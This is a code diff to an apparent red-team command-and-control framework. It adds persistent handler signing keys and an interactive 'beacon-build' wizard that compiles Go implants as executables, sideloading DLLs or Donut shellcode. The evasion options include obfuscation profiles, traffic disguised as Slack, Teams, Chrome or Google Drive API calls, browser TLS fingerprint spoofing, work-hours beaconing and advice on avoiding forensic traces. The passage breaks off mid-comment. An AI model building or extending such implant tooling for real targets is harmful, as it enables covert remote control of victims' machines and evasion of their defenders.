@@ -38,6 +38,7 @@ except ImportError:
         readline = None
 
 from .constants import (
+    BEACON_COMMANDS,
     CHUNK_SIZE,
     CLIENT_COMMANDS,
     ID_COMMANDS,
@@ -413,14 +414,57 @@ except ImportError:
 
 
 class _CommandSigner:
+    # Persistent private key. If this file exists, the same keypair is
+    # reused across handler restarts, so agents built against a
+    # previous handler run continue to verify tasks after a restart.
+    #
+    # Without persistence, the handler generates a fresh ECDSA keypair
+    # at every startup. Any agent whose build-time `ServerPubKeyPem`
+    # does not match the running handler's public key will silently
+    # drop every task at verifyTask — no log, no error, just
+    # "timed out" on the operator console. See the module docstring
+    # in beacon/engine.py for the wire format.
+    KEY_PATH = os.path.join('.keys', 'handler_signing.key')
+
     def __init__(self):
         if not _ECDSA_AVAILABLE:
             raise RuntimeError('cryptography not installed')
-        self.private = _ec.generate_private_key(_ec.SECP256R1())
+        self.private = self._load_or_generate()
         self.public_pem = self.private.public_key().public_bytes(
             encoding=_ser.Encoding.PEM,
             format=_ser.PublicFormat.SubjectPublicKeyInfo,
         ).decode('ascii')
+
+    def _load_or_generate(self):
+        path = self.KEY_PATH
+        # Load if present.
+        try:
+            if os.path.isfile(path):
+                with open(path, 'rb') as fh:
+                    pem = fh.read()
+                return _ser.load_pem_private_key(pem, password=None)
+        except Exception:
+            pass
+        # Generate and persist.
+        priv = _ec.generate_private_key(_ec.SECP256R1())
+        try:
+            os.makedirs(os.path.dirname(path) or '.', exist_ok=True)
+            with open(path, 'wb') as fh:
+                fh.write(priv.private_bytes(
+                    encoding=_ser.Encoding.PEM,
+                    format=_ser.PrivateFormat.PKCS8,
+                    encryption_algorithm=_ser.NoEncryption(),
+                ))
+            try:
+                os.chmod(path, 0o600)
+            except OSError:
+                pass
+        except OSError:
+            # If we cannot write, the key is still valid for this run.
+            # It just will not survive a restart, which means agents
+            # built against this handler will need rebuilding.
+            pass
+        return priv
 
     def sign(self, payload: bytes) -> bytes:
         return self.private.sign(payload, _ec.ECDSA(_hashes.SHA256()))
@@ -570,6 +614,22 @@ class TORNADOREVC2:
             except Exception as e:
                 print(f"[sign] disabled: {e}")
 
+        # Beacon subsystem — opt-in, populated by start() when
+        # --beacon-port is set. These three attributes are the only
+        # handles the shell handler keeps on the beacon subsystem; all
+        # beacon state lives inside self.beacon (BeaconEngine).
+        self.beacon_port     = None
+        self.beacon          = None
+        self.beacon_console  = None
+        self._beacon_listener = None
+        # Beacon mTLS overrides. Populated by main() from CLI args.
+        # When None, the beacon listener uses the handler's own
+        # mtls_certs/ bundle (or plain TLS if no CA is configured).
+        self.beacon_mtls_ca          = None
+        self.beacon_mtls_server_cert = None
+        self.beacon_mtls_server_key  = None
+        self.beacon_mtls_dir         = None
+
     def _build_payloads(self):
         return get_payloads(self.host, self.revshell_port, self.tls_port, self.mtls_port)
 
@@ -620,6 +680,932 @@ class TORNADOREVC2:
     def _get_session_logger(self, client_sock):
         info = self._client_info(client_sock)
         return info.get('logger') if info else None
+
+    # ------------------------------------------------------------------
+    # Beacon agent compilation
+    #
+    # `beacon-build` compiles the Go agent against the running handler's
+    # configuration. Called with no arguments it opens an interactive
+    # wizard; called with `<os> <arch> [flags]` it runs non-interactively.
+    # ------------------------------------------------------------------
+
+    def _beacon_build_dir(self):
+        """Return (source_dir, output_dir) for the beacon builder.
+
+        `source_dir` must be a directory whose grandparent is the repo
+        root, because BeaconBuilder computes `repo_root = dirname(dirname(
+        abspath(source_dir)))` and runs `go build ... ./agent` from there.
+        Passing <repo>/tornadorevc2/beacon satisfies that — its
+        grandparent is <repo>.
+        """
+        here = os.path.dirname(os.path.abspath(__file__))       # <repo>/tornadorevc2
+        source_dir = os.path.join(here, 'beacon')               # <repo>/tornadorevc2/beacon
+        output_dir = os.path.join(os.path.dirname(here), 'beacon_output')  # <repo>/beacon_output
+        return source_dir, output_dir
+
+    def _beacon_build_default_url(self):
+        """Guess a sensible callback URL from the running config.
+
+        Prefers the beacon port if the subsystem is enabled, otherwise
+        the HTTPS secondary listener's port. Falls back to 8444 so the
+        wizard always has something to offer.
+        """
+        port = self.beacon_port or self.h2_port or 8444
+        host = self.host if self.host not in ('0.0.0.0', '::') else '127.0.0.1'
+        return f"https://{host}:{port}"
+
+    def _beacon_build_interactive(self):
+        """Prompt for build parameters. Returns a dict, or None on cancel.
+
+        Every prompt accepts an empty line to take the default, or `q`
+        to abort. Choices are numbered so an operator can pick with one
+        keypress instead of typing a value.
+        """
+        c = self.colors
+
+        def _ask(prompt, default=''):
+            suffix = f" [{default}]" if default else ""
+            try:
+                val = input(f"  {prompt}{suffix}: ").strip()
+            except (EOFError, KeyboardInterrupt):
+                print()
+                return None
+            if val.lower() in ('q', 'quit', 'cancel'):
+                return None
+            return val or default
+
+        def _choose(title, options, default_index=0):
+            """options: list of (value, label, description_or_None)."""
+            print(f"\n{c['cyan']}{title}{c['end']}")
+            for i, (_v, label, desc) in enumerate(options, 1):
+                marker = '●' if (i - 1) == default_index else ' '
+                desc_str = f"  {c['yellow']}— {desc}{c['end']}" if desc else ""
+                print(f"  {marker} {i}. {label}{desc_str}")
+            while True:
+                try:
+                    val = input(
+                        f"  {c['green']}Choice "
+                        f"[{default_index + 1}]{c['end']} "
+                        f"{c['yellow']}(q to cancel){c['end']}: "
+                    ).strip().lower()
+                except (EOFError, KeyboardInterrupt):
+                    print()
+                    return None
+                if val == 'q':
+                    return None
+                if val == '':
+                    return options[default_index][0]
+                try:
+                    idx = int(val) - 1
+                except ValueError:
+                    print(f"  {c['red']}Enter a number between 1 and "
+                          f"{len(options)}{c['end']}")
+                    continue
+                if 0 <= idx < len(options):
+                    return options[idx][0]
+                print(f"  {c['red']}Out of range{c['end']}")
+
+        print(f"\n{c['cyan']}{'='*60}{c['end']}")
+        print(f"{c['cyan']}  Beacon Agent Builder{c['end']}")
+        print(f"{c['cyan']}{'='*60}{c['end']}")
+
+        # ---- 1. Target OS -----------------------------------------
+        target_os = _choose(
+            '[1/8] Target OS',
+            [
+                ('linux',   'linux',   'ELF binary — shells, servers, containers'),
+                ('windows', 'windows', 'PE binary — workstations, servers'),
+            ],
+            default_index=0,
+        )
+        if target_os is None:
+            return None
+
+        # ---- 2. Architecture --------------------------------------
+        arch_opts = [
+            ('amd64', 'amd64', 'x86-64 (most common)'),
+            ('arm64', 'arm64', 'AArch64 (modern servers, macOS via cross)'),
+            ('386',   '386',   '32-bit x86 (legacy)'),
+        ]
+        target_arch = _choose('[2/8] Architecture', arch_opts, 0)
+        if target_arch is None:
+            return None
+
+        # ---- 3. Output format -------------------------------------
+        fmt_opts = [
+            ('elf',       'elf',       'plain ELF executable'),
+            ('shellcode', 'shellcode', 'position-independent via Donut'),
+        ] if target_os == 'linux' else [
+            ('exe',       'exe',       'Windows PE executable'),
+            ('dll',       'dll',       'Windows DLL (for sideloading)'),
+            ('shellcode', 'shellcode', 'position-independent via Donut'),
+        ]
+        output_format = _choose('[3/8] Output format', fmt_opts, 0)
+        if output_format is None:
+            return None
+
+        # ---- 4. Callback URL --------------------------------------
+        default_url = self._beacon_build_default_url()
+        print(f"\n{c['cyan']}[4/8] Callback URL{c['end']}")
+        print(f"  {c['yellow']}Use the handler's reachable address, "
+              f"not 127.0.0.1 unless the target is local.{c['end']}")
+        url = _ask('Callback URL', default_url)
+        if url is None:
+            return None
+
+        # ---- 5. OPSEC profile -------------------------------------
+        try:
+            from .beacon.builder import OPSEC_PROFILES
+            opsec_values = list(OPSEC_PROFILES.keys())
+        except Exception:
+            opsec_values = ['default', 'stealth', 'opsec', 'paranoid']
+        opsec_desc = {
+            'default':  'No evasion — lab testing only',
+            'stealth':  'String obfuscation — standard engagements',
+            'opsec':    'Full suite, needs garble installed',
+            'paranoid': 'Ops + extra sleep mask, needs garble',
+        }
+        opsec_opts = [
+            (name, name, opsec_desc.get(name, '')) for name in opsec_values
+        ]
+        profile_name = _choose('[5/8] OPSEC profile', opsec_opts, 0)
+        if profile_name is None:
+            return None
+
+        # ---- 6. C2 profile ----------------------------------------
+        try:
+            from .beacon.builder import list_c2_profiles
+            c2_names = list_c2_profiles()
+        except Exception:
+            c2_names = []
+        c2_desc = {
+            'default':      '/beacon, /tasks, /results',
+            'chrome':       '/api/v1/analytics/* (Chrome UA)',
+            'slack':        '/api/client.connect (Slack UA)',
+            'teams':        '/api/mt/part/emea-03/beta/* (Teams UA)',
+            'discord':      '/api/v9/* (Discord UA)',
+            'dropbox':      '/api/2/* (Dropbox UA)',
+            'notion':       '/api/v3/* (Notion UA)',
+            'google-drive': '/drive/v3/* (Google Drive UA)',
+        }
+        c2_opts = [('', '(handler default)', 'whatever --profile gave the handler')]
+        c2_opts += [(n, n, c2_desc.get(n, '')) for n in c2_names]
+        c2_default_idx = 1 if 'chrome' in c2_names else 0
+        c2_profile = _choose('[6/8] C2 profile', c2_opts, c2_default_idx)
+        if c2_profile is None:
+            return None
+
+        # ---- 7. TLS fingerprint -----------------------------------
+        tls_opts = [
+            ('go',      'go',      'standard library — pre-utls default'),
+            ('chrome',  'chrome',  'Chrome 120 ClientHello via uTLS'),
+            ('firefox', 'firefox', 'Firefox 120 ClientHello via uTLS'),
+            ('safari',  'safari',  'Safari 16.0 ClientHello via uTLS'),
+        ]
+        tls_profile = _choose('[7/8] TLS fingerprint', tls_opts, 0)
+        if tls_profile is None:
+            return None
+
+        # ---- 8. Lifecycle (kill days, work hours, mTLS) -----------
+        print(f"\n{c['cyan']}[8/8] Lifecycle{c['end']}")
+        kill_days = _ask('Kill days (0 = no kill date)', '30')
+        if kill_days is None:
+            return None
+        try:
+            kill_days_int = int(kill_days)
+            if kill_days_int < 0:
+                raise ValueError
+        except (TypeError, ValueError):
+            print(f"  {c['yellow']}Invalid — using 30{c['end']}")
+            kill_days_int = 30
+
+        # Diagnostic stderr on the target. Off by default — a payload
+        # that writes to stderr leaves traces in journald, Windows
+        # Event Log when wrapped, or process accounting on some
+        # UNIX systems. Enable for a debugging build only.
+        print(f"  {c['yellow']}Verbose output writes diagnostic lines "
+              f"to stderr on the target. Use only for debugging — it "
+              f"leaves forensic artefacts.{c['end']}")
+        verbose_choice = _ask('Enable verbose stderr on the target? (y/N)',
+                              'n')
+        if verbose_choice is None:
+            return None
+        verbose_flag = str(verbose_choice).lower() in ('y', 'yes')
+
+        # Working-hours window. The beacon suppresses check-ins
+        # outside this window so its network footprint tracks the
+        # target population. Target local time, "HH:MM-HH:MM". A
+        # wrapped window (start > end) is valid — 22:00-06:00 for
+        # overnight operations. `off` disables the gate.
+        print(f"  {c['yellow']}Work hours suppress check-ins outside "
+              f"the window (target local time). Examples: "
+              f"08:00-19:00, 22:00-06:00 (overnight), off (24/7)."
+              f"{c['end']}")
+        work_spec = _ask('Work hours (HH:MM-HH:MM or off)',
+                         '08:00-19:00')
+        if work_spec is None:
+            return None
+        work_spec = work_spec.strip().lower()
+
+        def _valid_clock(s: str) -> bool:
+            if ':' not in s:
+                return False
+            try:
+                h, m = s.split(':', 1)
+                return 0 <= int(h) <= 23 and 0 <= int(m) <= 59
+            except (ValueError, TypeError):
+                return False
+
+        if work_spec in ('off', 'none', 'disable', '00:00-00:00'):
+            work_hours_start, work_hours_end = '00:00', '00:00'
+        elif '-' in work_spec:
+            ws, we = work_spec.split('-', 1)
+            ws, we = ws.strip(), we.strip()
+            if _valid_clock(ws) and _valid_clock(we):
+                work_hours_start, work_hours_end = ws, we
+            else:
+                print(f"  {c['yellow']}Invalid format — using "
+                      f"08:00-19:00{c['end']}")
+                work_hours_start, work_hours_end = '08:00', '19:00'
+        else:
+            print(f"  {c['yellow']}Unrecognised — using 08:00-19:00"
+                  f"{c['end']}")
+            work_hours_start, work_hours_end = '08:00', '19:00'
+
+        use_mtls = _ask('Embed mTLS client bundle? (y/N)', 'n')
+        if use_mtls is None:
+            return None
+        mtls_yes = str(use_mtls).lower() in ('y', 'yes')
+
+        # When embedding, ask for the bundle directory. The default
+        # is the handler's own mtls_certs/ directory. Any directory
+        # containing client.pem, client.key, and ca.pem works.
+        mtls_dir = None
+        mtls_cert_override = None
+        mtls_key_override  = None
+        mtls_ca_override   = None
+        if mtls_yes:
+            default_dir = self.mtls_cert_dir or 'mtls_certs'
+            print(f"  {c['yellow']}Directory must contain client.pem, "
+                  f"client.key, and ca.pem.{c['end']}")
+            mtls_dir = _ask('mTLS directory', default_dir)
+            if mtls_dir is None:
+                return None
+            mtls_dir = os.path.expanduser(mtls_dir)
+
+            # Validate the three standard files. If any is missing,
+            # fall through to the advanced per-file override prompts
+            # rather than aborting — the operator may have named the
+            # files differently.
+            cert_path = os.path.join(mtls_dir, 'client.pem')
+            key_path  = os.path.join(mtls_dir, 'client.key')
+            ca_path   = os.path.join(mtls_dir, 'ca.pem')
+            missing = [p for p in (cert_path, key_path, ca_path)
+                       if not os.path.exists(p)]
+
+            if missing:
+                print(f"  {c['yellow']}Not found in {mtls_dir}: "
+                      f"{', '.join(os.path.basename(m) for m in missing)}"
+                      f"{c['end']}")
+                adv = _ask('Override individual file paths? (y/N)', 'y')
+                if adv is None:
+                    return None
+                if str(adv).lower() in ('y', 'yes'):
+                    cert_path = _ask('Client certificate path', cert_path)
+                    if cert_path is None:
+                        return None
+                    key_path = _ask('Client key path', key_path)
+                    if key_path is None:
+                        return None
+                    ca_path = _ask('Root CA path', ca_path)
+                    if ca_path is None:
+                        return None
+                    mtls_cert_override = cert_path
+                    mtls_key_override  = key_path
+                    mtls_ca_override   = ca_path
+
+            # Final validation. Fail loudly rather than building an
+            # agent that silently cannot complete the handshake.
+            for label, path in (('cert', mtls_cert_override or cert_path),
+                                ('key',  mtls_key_override  or key_path),
+                                ('ca',   mtls_ca_override   or ca_path)):
+                if not os.path.isfile(path):
+                    print(f"  {c['red']}Missing {label}: {path}"
+                          f"{c['end']}")
+                    return None
+
+        # ---- Summary and confirmation -----------------------------
+        print(f"\n{c['cyan']}{'='*60}{c['end']}")
+        print(f"{c['cyan']}  Build summary{c['end']}")
+        print(f"{c['cyan']}{'='*60}{c['end']}")
+        print(f"  Target       : {target_os}/{target_arch}")
+        print(f"  Format       : {output_format}")
+        print(f"  Callback URL : {url}")
+        print(f"  OPSEC        : {profile_name}")
+        print(f"  C2 profile   : {c2_profile or '(handler default)'}")
+        print(f"  Kill days    : {kill_days_int}")
+        if work_hours_start == work_hours_end:
+            print(f"  Work hours   : off (24/7)")
+        else:
+            print(f"  Work hours   : {work_hours_start}-{work_hours_end} "
+                  f"(target local time)")
+        if verbose_flag:
+            print(f"  Verbose      : {c['red']}yes — debug build, "
+                  f"leaves stderr traces on the target{c['end']}")
+        else:
+            print(f"  Verbose      : no")
+        if mtls_yes:
+            print(f"  mTLS bundle  : yes ({mtls_dir})")
+            if mtls_cert_override:
+                print(f"    client cert: {mtls_cert_override}")
+                print(f"    client key : {mtls_key_override}")
+                print(f"    root CA    : {mtls_ca_override}")
+            # Show what the running handler expects, so a mismatch is
+            # visible before the confirmation prompt.
+            handler_ca = getattr(self, 'beacon_mtls_ca', None)
+            handler_dir = getattr(self, 'beacon_mtls_dir', None)
+            if handler_dir:
+                print(f"  {c['yellow']}Listener mTLS: "
+                      f"{handler_dir} (from --beacon-mtls-dir)"
+                      f"{c['end']}")
+            elif handler_ca:
+                print(f"  {c['yellow']}Listener mTLS: "
+                      f"{handler_ca} (from --beacon-mtls-ca)"
+                      f"{c['end']}")
+            else:
+                print(f"  {c['yellow']}Listener mTLS: NOT CONFIGURED "
+                      f"— the beacon listener is running server-TLS "
+                      f"only and will reject this agent's handshake"
+                      f"{c['end']}")
+        else:
+            print(f"  mTLS bundle  : no")
+        print()
+
+        try:
+            confirm = input(
+                f"  {c['green']}Compile? [Y/n]{c['end']}: "
+            ).strip().lower()
+        except (EOFError, KeyboardInterrupt):
+            print()
+            return None
+        if confirm and confirm not in ('y', 'yes'):
+            return None
+
+        return {
+            'target_os':        target_os,
+            'target_arch':      target_arch,
+            'output_format':    output_format,
+            'url':              url,
+            'profile_name':     profile_name,
+            'kill_days':        kill_days_int,
+            'use_mtls':         mtls_yes,
+            'c2_profile':       c2_profile or None,
+            'tls_profile':      tls_profile,
+            'work_hours_start': work_hours_start,
+            'work_hours_end':   work_hours_end,
+            'mtls_dir':         mtls_dir,
+            'mtls_cert':        mtls_cert_override,
+            'mtls_key':         mtls_key_override,
+            'mtls_ca':          mtls_ca_override,
+            'verbose':          verbose_flag,
+        }
+
+    def beacon_build(self, cmd_parts):
+        """
+        Compile a beacon agent.
+
+        Usage:
+            beacon-build                          # interactive wizard
+            beacon-build <os> <arch> [flags]
+
+        Flags (non-interactive mode):
+            --format <exe|dll|elf|shellcode>      Default: exe on Windows,
+                                                  elf elsewhere
+            --url <https://host:port>             Default: derived from
+                                                  the running handler
+            --profile <default|stealth|opsec|paranoid>
+            --kill-days <N>                       Default: 30
+            --mtls                                Embed the handler's
+                                                  mTLS client bundle
+        """
+        c = self.colors
+
+        try:
+            from .beacon.builder import (
+                BeaconBuilder, BeaconBuildConfig, OPSEC_PROFILES,
+            )
+        except ImportError as exc:
+            print(f"{c['red']}[BEACON-BUILD] builder unavailable: {exc}"
+                  f"{c['end']}")
+            print(f"{c['yellow']}Ensure the beacon/ package is present "
+                  f"and `pip install flask` has been run.{c['end']}")
+            return
+
+        args = cmd_parts[1:]
+
+        # ---- Parameter collection -------------------------------------
+        if not args:
+            params = self._beacon_build_interactive()
+            if params is None:
+                print(f"{c['yellow']}[BEACON-BUILD] Cancelled{c['end']}")
+                return
+        else:
+            if len(args) < 2:
+                print(f"{c['red']}Usage: beacon-build <os> <arch> "
+                      f"[--format <fmt>] [--url <url>] "
+                      f"[--profile <name>] [--kill-days N] "
+                      f"[--c2-profile <name>] "
+                      f"[--tls-profile <go|chrome|firefox|safari>] "
+                      f"[--work-hours HH:MM-HH:MM | off] "
+                      f"[--mtls [--mtls-dir <dir>] "
+                      f"[--mtls-cert <path>] [--mtls-key <path>] "
+                      f"[--mtls-ca <path>]] "
+                      f"[--verbose]{c['end']}")
+                return
+
+            target_os = args[0].lower()
+            target_arch = args[1].lower()
+            params = {
+                'target_os':        target_os,
+                'target_arch':      target_arch,
+                'output_format':    'exe' if target_os == 'windows' else 'elf',
+                'url':              self._beacon_build_default_url(),
+                'profile_name':     'default',
+                'kill_days':        30,
+                'use_mtls':         False,
+                'c2_profile':       None,
+                'tls_profile':      'go',
+                'work_hours_start': '08:00',
+                'work_hours_end':   '19:00',
+                'mtls_dir':         None,
+                'mtls_cert':        None,
+                'mtls_key':         None,
+                'mtls_ca':          None,
+                'verbose':          False,
+            }
+
+            i = 2
+            while i < len(args):
+                flag = args[i]
+                val = args[i + 1] if i + 1 < len(args) else None
+                if flag == '--format' and val:
+                    params['output_format'] = val
+                    i += 2
+                elif flag == '--url' and val:
+                    params['url'] = val
+                    i += 2
+                elif flag == '--profile' and val:
+                    params['profile_name'] = val
+                    i += 2
+                elif flag == '--kill-days' and val:
+                    try:
+                        params['kill_days'] = int(val)
+                    except ValueError:
+                        print(f"{c['red']}Invalid --kill-days: {val}"
+                              f"{c['end']}")
+                        return
+                    i += 2
+                elif flag == '--mtls':
+                    params['use_mtls'] = True
+                    i += 1
+                elif flag == '--c2-profile' and val:
+                    params['c2_profile'] = val
+                    i += 2
+                elif flag == '--tls-profile' and val:
+                    params['tls_profile'] = val
+                    i += 2
+                elif flag == '--work-hours' and val:
+                    # Accept "HH:MM-HH:MM" or "off". A wrapped window
+                    # (start > end, e.g. 22:00-06:00) is supported by
+                    # the agent's insideWorkHours check.
+                    spec = val.strip().lower()
+                    if spec in ('off', 'none', 'disable'):
+                        params['work_hours_start'] = '00:00'
+                        params['work_hours_end']   = '00:00'
+                        i += 2
+                        continue
+                    if '-' not in spec:
+                        print(f"{c['red']}--work-hours expects "
+                              f"HH:MM-HH:MM or 'off'{c['end']}")
+                        return
+                    parts = spec.split('-', 1)
+                    params['work_hours_start'] = parts[0].strip()
+                    params['work_hours_end']   = parts[1].strip()
+                    i += 2
+                elif flag == '--work-off':
+                    # Shorthand for `--work-hours off`. Beacon polls
+                    # 24/7; useful for lab targets where the operator
+                    # wants immediate response regardless of the hour.
+                    params['work_hours_start'] = '00:00'
+                    params['work_hours_end']   = '00:00'
+                    i += 1
+                elif flag == '--mtls-dir' and val:
+                    # Point the build at a specific mTLS bundle
+                    # directory. Implies --mtls. The directory is
+                    # expected to contain client.pem, client.key, and
+                    # ca.pem (the standard filenames). Use the
+                    # individual --mtls-cert / --mtls-key / --mtls-ca
+                    # flags to override any of those three.
+                    params['use_mtls'] = True
+                    params['mtls_dir'] = val
+                    i += 2
+                elif flag == '--mtls-cert' and val:
+                    params['use_mtls'] = True
+                    params['mtls_cert'] = val
+                    i += 2
+                elif flag == '--mtls-key' and val:
+                    params['use_mtls'] = True
+                    params['mtls_key'] = val
+                    i += 2
+                elif flag == '--mtls-ca' and val:
+                    params['use_mtls'] = True
+                    params['mtls_ca'] = val
+                    i += 2
+                elif flag == '--verbose':
+                    # Diagnostic stderr on the target. Debug only —
+                    # the agent leaves strings in journald, Windows
+                    # Event Log when wrapped, and process accounting
+                    # on some UNIX systems. Never enable for a live
+                    # engagement.
+                    params['verbose'] = True
+                    i += 1
+                else:
+                    print(f"{c['red']}Unknown flag: {flag}{c['end']}")
+                    return
+
+        # ---- Validate ------------------------------------------------
+        if params['target_os'] not in ('linux', 'windows'):
+            print(f"{c['red']}[BEACON-BUILD] Unsupported OS: "
+                  f"{params['target_os']}{c['end']}")
+            return
+
+        profile_name = params['profile_name']
+        if profile_name not in OPSEC_PROFILES:
+            print(f"{c['red']}[BEACON-BUILD] Unknown profile "
+                  f"'{profile_name}'. Available: "
+                  f"{', '.join(OPSEC_PROFILES.keys())}{c['end']}")
+            return
+
+        source_dir, output_dir = self._beacon_build_dir()
+        if not os.path.isdir(source_dir):
+            print(f"{c['red']}[BEACON-BUILD] Agent source not found at "
+                  f"{source_dir}{c['end']}")
+            return
+
+        os.makedirs(output_dir, exist_ok=True)
+
+        # ---- Build config --------------------------------------------
+        # Copy the named profile's defaults, then override the fields
+        # the operator chose. This preserves the profile's evasion
+        # flags while letting `--url`, `--kill-days`, etc. take effect.
+        base = OPSEC_PROFILES[profile_name]
+        cfg = BeaconBuildConfig(**dict(base.__dict__))
+        cfg.url           = params['url']
+        cfg.profile_name  = profile_name
+        cfg.kill_days     = params['kill_days']
+        cfg.target_os     = params['target_os']
+        cfg.target_arch   = params['target_arch']
+        cfg.output_format    = params['output_format']
+        cfg.tls_profile      = params.get('tls_profile') or 'go'
+        cfg.work_hours_start = params.get('work_hours_start') or '08:00'
+        cfg.work_hours_end   = params.get('work_hours_end')   or '19:00'
+        cfg.verbose          = bool(params.get('verbose', False))
+
+        # Stable agent signing keypair. Without this, every build
+        # generates a fresh ECDSA keypair, so a redeploy over an
+        # existing session presents a new pubkey against the same
+        # fingerprint and the server's TOFU pinning rejects it with
+        # 403. Stored under the repo's .keys/ directory so it survives
+        # across rebuilds and is never written into beacon_output/.
+        keys_dir = os.path.normpath(os.path.join(
+            os.path.dirname(os.path.abspath(__file__)), '..', '.keys',
+        ))
+        os.makedirs(keys_dir, exist_ok=True)
+        cfg.agent_keypair_path = os.path.join(
+            keys_dir, 'agent_signing.key',
+        )
+
+        # Embed the handler's ECDSA public key so the agent can verify
+        # signed tasks. The builder reads it from a path passed via
+        # `server_pubkey_path`; stage it in the operator's temp dir so
+        # it never lands in beacon_output/ or anywhere else the agent
+        # might be run from.
+        pubkey_tmp = None
+        if self.signer is not None:
+            try:
+                import tempfile
+                tf = tempfile.NamedTemporaryFile(
+                    mode='w', suffix='.pem', delete=False,
+                    encoding='utf-8',
+                )
+                tf.write(self.signer.public_pem)
+                tf.close()
+                pubkey_tmp = tf.name
+                cfg.server_pubkey_path = pubkey_tmp
+            except Exception as exc:
+                print(f"{c['yellow']}[BEACON-BUILD] Could not stage server "
+                      f"pubkey: {exc} — task signing will be disabled "
+                      f"on the built agent{self.colors['end']}")
+        else:
+            print(f"{c['yellow']}[BEACON-BUILD] Handler signer is not "
+                  f"active — tasks will not be signed{self.colors['end']}")
+
+        # Optional mTLS bundle. Priority order:
+        #   1. Per-file overrides from --mtls-cert / --mtls-key /
+        #      --mtls-ca (or the wizard's advanced prompt)
+        #   2. Standard filenames under --mtls-dir / the wizard's
+        #      directory answer
+        #   3. The handler's own mtls_certs/ directory
+        if params['use_mtls']:
+            mtls_dir = params.get('mtls_dir')
+            if mtls_dir:
+                mtls_dir = os.path.expanduser(mtls_dir)
+                default_cert = os.path.join(mtls_dir, 'client.pem')
+                default_key  = os.path.join(mtls_dir, 'client.key')
+                default_ca   = os.path.join(mtls_dir, 'ca.pem')
+            else:
+                default_cert = self.mtls_client_cert
+                default_key  = self.mtls_client_key
+                default_ca   = self.mtls_ca_cert
+
+            cert_path = params.get('mtls_cert') or default_cert
+            key_path  = params.get('mtls_key')  or default_key
+            ca_path   = params.get('mtls_ca')   or default_ca
+
+            needed = (cert_path, key_path, ca_path)
+            if all(os.path.isfile(p) for p in needed):
+                cfg.client_cert_path = cert_path
+                cfg.client_key_path  = key_path
+                cfg.root_ca_path     = ca_path
+                print(f"{c['cyan']}[BEACON-BUILD] mTLS bundle:"
+                      f"{c['end']}")
+                print(f"{c['cyan']}  cert: {cert_path}{c['end']}")
+                print(f"{c['cyan']}  key : {key_path}{c['end']}")
+                print(f"{c['cyan']}  ca  : {ca_path}{c['end']}")
+            else:
+                missing = [p for p in needed if not os.path.isfile(p)]
+                print(f"{c['red']}[BEACON-BUILD] mTLS material missing:"
+                      f"{c['end']}")
+                for p in missing:
+                    print(f"{c['red']}  {p}{c['end']}")
+                if pubkey_tmp:
+                    try:
+                        os.remove(pubkey_tmp)
+                    except OSError:
+                        pass
+                return
+
+        # ---- C2 profile ---------------------------------------------
+        # Priority order:
+        #   1. --c2-profile <name|path> passed on the command line
+        #   2. C2 profile from the handler's own malleable profile
+        #      (`--profile <path>` at startup)
+        #   3. Handler built-in defaults
+        c2_profile = None
+        if params.get('c2_profile'):
+            try:
+                from .beacon.builder import load_c2_profile
+            except ImportError:
+                load_c2_profile = None
+            if load_c2_profile is not None:
+                c2_profile = load_c2_profile(params['c2_profile'])
+                if c2_profile is None:
+                    print(f"{c['red']}[BEACON-BUILD] C2 profile "
+                          f"'{params['c2_profile']}' not found"
+                          f"{c['end']}")
+                    return
+                print(f"{c['cyan']}[BEACON-BUILD] Using C2 profile: "
+                      f"{params['c2_profile']}{c['end']}")
+
+        if c2_profile is None:
+            # Fall back to the handler's own profile, if it has one.
+            http2 = (self.profile or {}).get('http2', {}) or {}
+            c2_profile = {
+                'user_agent':       http2.get('user_agent', ''),
+                'linux_user_agent': http2.get('linux_user_agent', ''),
+                'beacon_path':      '/beacon',
+                'tasks_path':       '/tasks',
+                'results_path':     '/results',
+                'extra_headers':    dict(http2.get('extra_headers') or {}),
+                'request_headers':  {},
+            }
+
+        beacon_profile = c2_profile
+
+        # ---- mTLS compatibility preflight ---------------------------
+        # The agent embeds a specific CA at build time and verifies
+        # the server chain against it. The beacon listener presents a
+        # specific server certificate and verifies the agent's client
+        # certificate against a specific CA. If those two CAs are not
+        # the same, the handshake fails on both sides and the agent
+        # retries forever with no operator-visible signal unless the
+        # build enabled Verbose.
+        #
+        # This check does not abort the build — the operator may be
+        # intentionally preparing an agent for a listener that will be
+        # restarted later. It prints a prominent warning so the
+        # mismatch is not a surprise at deployment time.
+        if params['use_mtls']:
+            warn_lines = []
+
+            # Case 1: handler has no beacon mTLS configured at all.
+            # The listener is serving plain TLS; the agent will reject
+            # the server chain unconditionally.
+            if (getattr(self, 'beacon_mtls_ca', None) is None
+                    and getattr(self, 'beacon_mtls_dir', None) is None):
+                warn_lines.append(
+                    "This build embeds an mTLS client bundle, but the "
+                    "running beacon listener is NOT configured for mTLS "
+                    "(no --beacon-mtls-ca or --beacon-mtls-dir at "
+                    "handler start). The agent will reject the server "
+                    "certificate chain on every check-in. Restart the "
+                    "handler with matching mTLS flags, or rebuild "
+                    "without --mtls."
+                )
+            else:
+                # Case 2: handler is mTLS, but the bundle differs from
+                # what the operator selected for this build.
+                build_dir = params.get('mtls_dir')
+                if build_dir:
+                    build_dir_norm = os.path.realpath(
+                        os.path.expanduser(build_dir)
+                    )
+                else:
+                    # No explicit dir — using the handler's own
+                    # mtls_certs/. Resolve to the real path so a
+                    # symlink or relative-path difference does not
+                    # produce a false warning.
+                    build_dir_norm = os.path.realpath(self.mtls_cert_dir)
+
+                handler_dir = getattr(self, 'beacon_mtls_dir', None)
+                if handler_dir:
+                    handler_dir_norm = os.path.realpath(
+                        os.path.expanduser(handler_dir)
+                    )
+                elif getattr(self, 'beacon_mtls_ca', None):
+                    # Handler uses explicit --beacon-mtls-ca without
+                    # --beacon-mtls-dir. Compare the CA file paths
+                    # instead of directories.
+                    handler_dir_norm = os.path.realpath(
+                        os.path.dirname(self.beacon_mtls_ca)
+                    )
+                else:
+                    handler_dir_norm = None
+
+                # If we could not derive a comparable path on the
+                # handler side, skip the directory comparison and fall
+                # back to a CA-fingerprint check — less precise but
+                # does not silently pass a real mismatch.
+                if (handler_dir_norm is not None
+                        and handler_dir_norm != build_dir_norm):
+                    warn_lines.append(
+                        f"Bundle mismatch: this build uses "
+                        f"{build_dir_norm}, but the running beacon "
+                        f"listener is configured with "
+                        f"{handler_dir_norm}. The agent's embedded CA "
+                        f"will not match the server's chain. Either "
+                        f"rebuild with --mtls-dir {handler_dir_norm}, "
+                        f"or restart the handler with "
+                        f"--beacon-mtls-dir {build_dir_norm} before "
+                        f"deploying the agent."
+                    )
+
+                # CA-content fingerprint check. Runs whenever both CA
+                # files exist. Catches the case where two directories
+                # hold byte-identical bundles under different names
+                # (which is fine) and the case where the directories
